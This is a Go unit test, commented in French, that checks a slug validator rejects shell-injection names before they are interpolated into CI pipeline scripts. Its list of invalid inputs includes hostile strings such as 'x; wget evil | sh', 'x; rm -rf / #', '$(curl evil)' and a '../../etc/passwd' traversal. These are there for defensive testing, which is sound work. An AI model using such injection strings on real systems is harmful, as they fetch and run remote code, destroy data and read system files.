package api

import "testing"

// TestValidateSlugBlocksShellInjection verifie que les noms interpoles dans
// des scripts shell de pipeline CI (nom de projet -> {{.ServiceName}}, nom
// de recette -> $RECETTE_NAME) sur un runner a acces au socket Docker hote
// sont rejetes des lors qu'ils contiennent autre chose qu'un slug simple.
func TestValidateSlugBlocksShellInjection(t *testing.T) {
	valid := []string{"my-project", "a", "svc123", "go-rest-api-2"}
	for _, v := range valid {
		if err := validateSlug(v); err != nil {
			t.Errorf("validateSlug(%q) attendu valide, erreur: %v", v, err)
		}
	}

	invalid := []string{
		"x; wget evil | sh",
		"x; rm -rf / #",
		"$(curl evil)",
		"`whoami`",
		"../../etc/passwd",
		"",
		"UPPERCASE",
		"-starts-with-dash",
		"has spaces",
		"trailing;semicolon",
	}
	for _, v := range invalid {
		if err := validateSlug(v); err == nil {
			t.Errorf("validateSlug(%q) attendu invalide, mais accepté", v)
		}
	}
}
